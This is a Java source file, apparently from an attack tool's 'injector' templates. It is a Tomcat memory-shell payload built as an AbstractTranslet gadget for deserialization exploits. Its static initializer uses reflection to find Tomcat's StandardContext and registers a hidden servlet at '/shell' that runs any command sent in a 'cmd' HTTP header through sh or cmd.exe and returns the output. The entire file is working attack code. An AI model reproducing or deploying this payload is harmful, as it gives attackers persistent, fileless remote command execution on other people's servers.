package net.roboterh.injector.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.coyote.Request;
import org.apache.coyote.RequestInfo;

import javax.servlet.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

public class TomcatServlet extends AbstractTranslet {

    static {
        try {
            String servletName = "roboterh";
            String cmdHeader = "cmd";
            String servletRoute = "/shell";

            boolean flag = false;
            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),"threads");
            for (int i=0;i<threads.length;i++){
                Thread thread = threads[i];
                if (thread != null) {
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("http")) {
                        Object target = getField(thread, "target");
                        Object global = null;
                        if (target instanceof Runnable) {
                            // 需要遍历其中的 this$0/handler/global
                            // 需要进行异常捕获，因为存在找不到的情况
                            try {
                                global = getField(getField(getField(target, "this$0"), "handler"), "global");
                            } catch (NoSuchFieldException fieldException) {
                                fieldException.printStackTrace();
                            }
                        }
                        // 如果成功找到了 我们的 global ，我们就从里面获取我们的 processors
                        if (global != null) {
                            List processors = (List) getField(global, "processors");
                            for (i = 0; i < processors.size(); i++) {
                                RequestInfo requestInfo = (RequestInfo) processors.get(i);
                                if (requestInfo != null) {
                                    Request tempRequest = (Request) getField(requestInfo, "req");
                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
                                    Response response = request.getResponse();

                                    ServletContext servletContext = null;
                                    System.out.println("Request object is null : " + (request == null));

                                    //从req中获取ServletContext对象
                                    if (request != null) {
                                        try {
                                            servletContext = request.getServletContext();
                                        } catch (Exception e) {
                                            e.printStackTrace();
                                        }
                                    }

                                    if (servletContext.getServletRegistration(servletName) == null) {
                                        StandardContext o = null;

                                        // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                                        while (o == null) {
                                            Field f = servletContext.getClass().getDeclaredField("context");
                                            f.setAccessible(true);
                                            Object object = f.get(servletContext);

                                            if (object instanceof ServletContext) {
                                                servletContext = (ServletContext) object;
                                            } else if (object instanceof StandardContext) {
                                                o = (StandardContext) object;
                                            }
                                        }

                                        //自定义servlet
                                        Servlet servlet = new Servlet() {
                                            @Override
                                            public void init(ServletConfig servletConfig) throws ServletException {

                                            }

                                            @Override
                                            public ServletConfig getServletConfig() {
                                                return null;
                                            }

                                            @Override
                                            public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
                                                HttpServletRequest servletRequest1 = (HttpServletRequest) servletRequest;
                                                String cmd = servletRequest1.getHeader(cmdHeader);
                                                boolean isLinux = true;
                                                String osTyp = System.getProperty("os.name");
                                                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                                                    isLinux = false;
                                                }
                                                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                                                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                                                Scanner s = new Scanner(in).useDelimiter("\\a");
                                                String output = s.hasNext() ? s.next() : "";
                                                PrintWriter out = servletResponse.getWriter();
                                                out.println(output);
                                                out.flush();
                                                out.close();
                                            }

                                            @Override
                                            public String getServletInfo() {
                                                return null;
                                            }

                                            @Override
                                            public void destroy() {

                                            }
                                        };

                                        //用Wrapper封装servlet
                                        Wrapper newWrapper = o.createWrapper();
                                        newWrapper.setName(servletName);
                                        newWrapper.setLoadOnStartup(1);
                                        newWrapper.setServlet(servlet);

                                        //向children中添加Wrapper
                                        o.addChild(newWrapper);
                                        //添加servlet的映射
                                        o.addServletMappingDecoded(servletRoute, servletName);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object getField(Object obj,String fieldName) throws Exception{
        Field f0 = null;
        Class clas = obj.getClass();

        while (clas != Object.class){
            try {
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }

        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
